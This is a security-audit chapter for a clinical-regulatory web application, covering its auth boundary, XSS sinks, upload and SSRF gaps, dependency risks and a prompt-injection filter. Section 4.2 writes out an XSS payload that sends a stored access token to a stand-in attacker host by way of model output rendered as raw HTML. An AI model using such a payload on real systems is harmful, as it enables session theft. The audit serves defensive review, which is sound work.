# Chapter 04 — Security

**Verdict: the perimeter is well built and empirically holds. The gaps are inside it — one
reachable XSS sink fed by model output, uneven upload hardening, incomplete SSRF coverage,
and a suppressed unpatched RCE whose stated precondition was never checked.**

---

## 4.1 What holds — verified by probing, not by reading

Nine data endpoints probed unauthenticated against a running server, in
`NODE_ENV=development` (the mode where `authBoundary` is documented to run permissively):

| Endpoint | Result |
|---|---|
| `/api/projects`, `/api/c2c/projects`, `/api/vault/documents`, `/api/admin/business`, `/api/billing/dtc-pricing`, `/api/ana-ri/health`, `/api/users`, `/api/organizations`, `/api/metrics` | **401 on every one** |
| `/healthz`, `/readyz`, `/api/health`, `/api/time` | 200 (intended) |

`server/middleware/authBoundary.ts` mounts a default-deny boundary on `/api` at
`startup/middleware.ts:114`, **before any route registers**, with a 19-entry public
allowlist. The static sweep found only **589 of 4,077** endpoints (14.4%) carry a
route-level guard — but that measures **defence in depth, not exposure**, and this audit
reports it that way. The boundary held on everything tested.

Other controls verified present and sensibly built:

| Control | Location |
|---|---|
| Helmet + CSP with nonce, plus violation reporting | `enterprise-security.ts:156,197`; `routes/csp-report.ts` |
| CSRF with **exact-match** exempt paths (prefix matching explicitly rejected so `/healthzevil` cannot slip through) | `middleware/csrf.ts` |
| Rate limiting, Redis-backed with in-memory fallback | `rateLimiter.ts`, `redisRateLimiter.ts`, referenced in 58 files |
| Prototype-pollution scrub, deliberately ordered *after* body parsers | `startup/middleware.ts:82` |
| Immutability policy — 403s `DELETE`/`*bulk-delete` under 5 Part-11 prefixes | `startup/middleware.ts:144-150` |
| Centralised PHI/credential log redaction with a nested-key walker | `server/utils/logger.ts:1-26` |
| Boot fails closed on weak `MFA_ENCRYPTION_KEY`, bad `NODE_ENV`, missing DB/JWT secrets, bad audit-seal posture | `config/environment.ts` — 11 `throw` sites |

**SQL injection surface is small and clean.** Only 3 `sql.raw(` occurrences in non-test
server code; 126 `db.execute(sql\`…\`)` tagged templates (parameterised by Drizzle); 4
template-literal `query()` calls with interpolation, of which three interpolate `$N`
placeholders or internal identifiers and one (`committees/committee-service.ts:170`)
interpolates a `${table}` identifier that should be confirmed to come from a closed set.

**Secret hygiene is good.** A working-tree scan across code, config, YAML, Markdown and
Terraform for OpenAI/Anthropic/AWS/GitHub/Stripe/Slack key formats, private-key headers and
hardcoded JWTs returned **2 hits, both false positives** — UI placeholder strings for a
"Private Key" form field (`v2/fixtures/deep-research-data.ts:121`,
`services/connectors/connector-interface.ts:524`). `.gitignore` correctly excludes `.env*`
with `!*.example`. `.gitguardian.yaml` has a single, narrow, well-reasoned exclusion.

---

## 4.2 Cross-site scripting — one reachable sink, precisely located

There are **13** `dangerouslySetInnerHTML` sites in `client/src`. Triaging them by
sanitisation *and reachability* (rather than counting them) gives a much smaller and more
actionable answer:

| Category | Sites | Status |
|---|---|---|
| **Properly sanitised** | `Message.tsx` ×3, `DocumentStudioPane.tsx` | ✅ All route through `renderSafeMarkdown.ts` — a single `marked → DOMPurify.sanitize` choke point (`:22,88`) — or `sanitizeChatHtml`. Good design. |
| **Escaped by construction** | `Biostatistics.tsx:464`, `ReportEngine.tsx`, `CmcModule.tsx` | ✅ Each defines a local `mdToHtml()` whose `esc()` escapes `&`, `<`, `>` **before** applying formatting (`Biostatistics.tsx:465`). Safe — but it is **three copies of the same hand-rolled renderer** with no shared test, so a future edit to one is a silent regression. |
| **Unreachable** | `EditorTranslate.tsx` ×2, `EditorStudio.tsx`, `AnaVerbs.tsx` | ⚪ None appears in `v2/surfaceViews.ts`; they are part of the dead `Editor*` family. Not exploitable today. Severity downgraded accordingly. |
| **Reachable and unsanitised** | **`BatchDraft.tsx:490`** | 🔴 **P1** |
| Library pattern | `components/ui/chart.tsx:76` | ⚪ shadcn style-injection, low risk |

### The one that matters — `BatchDraft.tsx`

`BatchDraft` **is** registered (`v2/surfaceViews.ts:25`), so it is reachable. Its card body
renders raw:

```tsx
<div className="bd-card-body" dangerouslySetInnerHTML={{ __html: c.html || '…' }} />
```

and `c.html` is assigned directly from model output, twice:

```tsx
onSectionText:     (key, full)    => setCards(c => ({…, html: full }))          // :226  streaming
onSectionComplete: (key, content) => { const html = sample ? bdSample(…) : (content || ''); … }  // :231
```

**Failure scenario.** A user uploads a source document (or pastes content) containing
`<img src=x onerror="fetch('https://attacker/'+localStorage.trialsage_access_token)">`. The
drafting model echoes that fragment into a generated section — a normal thing for a model
asked to reproduce source content. It is written to `c.html` unmodified and rendered as
live HTML. Because drafts in this product are shared across a project team, the payload
executes in **every reviewer's** browser, with access to `localStorage`, where
`AGENTS.md` documents the auth tokens are kept (`trialsage_access_token`,
`trialsage_refresh_token`).

**Fix:** route it through the existing `renderSafeMarkdown` / `sanitizeChatHtml` choke
point. The correct implementation already exists in this codebase.
**Effort:** hours. **Acceptance test:** a drafted section containing an `onerror` payload
renders inert.

**Why this was never flagged:** `eslint.config.js:34` excludes **all of `client/src/**`** —
871 files, 191,327 lines — so `react/no-danger` could not fire. That exclusion is the root
cause, and is why Chapter 08 ranks re-enabling it above most other quality work.

## 4.3 File upload — hardening exists and is barely adopted

`server/middleware/uploadAllowlist.ts` and `uploadSafety.ts` are well designed: extension
allowlist, hard-blocked executable extensions, magic-byte signature verification against the
declared MIME (with an explicit note that *"multer's `file.mimetype` is attacker-controlled"*),
and ClamAV INSTREAM scanning that is **fail-closed in production** (`scanned === false` → 503).

Adoption, measured across 28 non-test `multer(` call sites:

| Property | Sites |
|---|---:|
| Has `fileFilter` | 21 / 28 |
| Has `limits.fileSize` | 27 / 28 |
| **Uses `uploadAllowlist`** | **2 / 28** |
| **Uses `uploadSafety` (magic-byte + AV)** | **2 / 28** |

Seven sites have no `fileFilter`. One — **`server/src/routes/stability.router.ts`** — has
**neither a filter nor a size limit**: an unbounded, unfiltered authenticated upload.
The others: `server/api/validation/index.js`, `routes/concept2cure.ts`,
`routes/ind-templates.ts`, `routes/knowledge-base.ts`, `routes/onboarding-proposals.ts`,
`services/DocumentDataCenterService.ts`. Full detail in `evidence/09-upload-safety.json`.

The controls are built; they simply were not wired to 26 of 28 entry points. That is a
days-of-work fix with an unusually good effort-to-risk ratio.

## 4.4 SSRF — guarded selectively

`server/utils/ssrfGuard.ts` exists and is applied in `services/connectors/*` (Veeva Vault,
FHIR R4, Medidata Rave, Ellucian Banner), `automation/webhook-notifications.ts` and
`routes/deep-research.ts`.

It is **not** applied at several bare `fetch(url)` call sites, including
`services/ana/AnaToolExecutor.ts:5933,15233,15339`,
`services/citation-verification-service.ts:108` and
`services/regulatory-currency/guidance-ingestion-service.ts:162`. The citation-verification
path is the one to prioritise: it fetches URLs that originate in model output or user-supplied
citations, which is precisely the untrusted-URL case the guard exists for.

## 4.5 Dependencies and supply chain

**Current, not stale** — React 19.2.5, Express 5.2.1, TypeScript 5.6.3, Vite 6.4.3, Vitest
4.1.7, Drizzle 0.45.2, helmet 8.1.0, esbuild 0.28.1, with 12 pinned security `overrides`
(`tar`, `form-data`, `undici`, `nodemailer`, `brace-expansion`, `http-proxy-middleware`).
Only laggard: `zod ^3.23.8`.

`scripts/ci/audit-with-allowlist.mjs` reduced accepted advisories **27 → 1**, requires
`npm ls` proof per entry, and detects stale entries. The single remaining acceptance is
correctly reasoned. This is the strongest governance artifact in the repository.

Two gaps:

- **Zero of 137 GitHub Actions `uses:` are SHA-pinned** — all floating tags. Already
  self-flagged as a GA blocker in `terraform-compliance.yml:22-38`, which notes the Checkov
  action was previously on `@master`. `pr-checks.yml:22` still uses the deprecated
  `returntocorp/semgrep-action@v1`.
- **`.trivyignore` suppresses `CVE-2026-45829`, a pre-auth RCE in chromadb 1.5.9**, correctly
  noting no patched release exists and requiring confirmation that *"chromadb is not exposed
  to untrusted pre-auth network input."* **That confirmation appears nowhere in the
  repository.** Either record it or remove the dependency; an unpatched pre-auth RCE with an
  unverified precondition is not an acceptance, it is an open question.

`.trivyignore` also contradicts `audit-with-allowlist.mjs` on a checkable fact (a
react-router advisory justified by usage the sibling file documents having disproven twice
with `npm ls`) — see Chapter 11 §11.9.

## 4.6 AI-specific security

- **Prompt injection** — `ai-gateway/promptInjection.ts` (89 lines) is thoughtfully designed:
  every pattern requires **both** an override verb **and** a meta-reference to the model's own
  instructions, specifically to avoid false positives on regulated prose like *"disregard the
  previous draft"*. Severity-tiered, with `high` failing closed on indirect content
  (RAG/tool-output/assistant history) and any hit blocking on user messages. Bounded gaps
  prevent ReDoS. Its own header is honest: *"This is a heuristic layer, not a guarantee."*
  The test is thin — 20 parameterised cases, though the 10 benign ones are the valuable half.
- **PII screening ships in the wrong mode.** `.env.example` defaults
  `AI_PII_ENFORCEMENT=audit` — observe, do not block. For a product whose users paste
  clinical narratives, `block` is the correct default.
- **Zero-retention defaults are off.** `OPENAI_ZERO_RETENTION=false` and
  `ANTHROPIC_ZERO_RETENTION=false` ship as defaults, so without an explicit operator change
  customer regulatory content is retained by providers under standard terms. Residency
  enforcement itself is genuinely well built (`ai-governance/approved-models.ts`).

## 4.7 Priority actions

| # | Action | Sev | Gate | Effort |
|---|---|---|---|---|
| 1 | Sanitise `BatchDraft.tsx:490` through the existing `renderSafeMarkdown` choke point | **P1** | G1 | hours |
| 2 | Re-enable ESLint on `client/src/**`; at minimum `react/no-danger` + security rules | P1 | G1 | days |
| 3 | Add `fileFilter` + `limits.fileSize` to `stability.router.ts`; wire `uploadAllowlist`/`uploadSafety` into all 28 multer sites | P1 | G1 | days |
| 4 | Apply `ssrfGuard` to `citation-verification-service.ts` and the `AnaToolExecutor` fetch sites | P1 | G1 | days |
| 5 | Flip `AI_PII_ENFORCEMENT` default to `block`; document the zero-retention posture as a deployment prerequisite | P1 | G2 | hours |
| 6 | Record the chromadb exposure determination, or drop the dependency | P1 | G2 | hours |
| 7 | Resolve the `.trivyignore` ↔ `audit-with-allowlist.mjs` contradiction; delete the entry if the package is genuinely absent | P2 | G2 | 1 h |
| 8 | SHA-pin all 137 GitHub Actions references; replace the deprecated Semgrep action | P2 | G2 | hours |
| 9 | Consolidate the three hand-rolled `mdToHtml()` copies into one tested helper | P3 | — | hours |
| 10 | Confirm `committee-service.ts:170`'s `${table}` comes from a closed set | P3 | — | 1 h |

Items 1–4 are the ones that matter for letting humans near this product, and together they
are roughly a week of work.
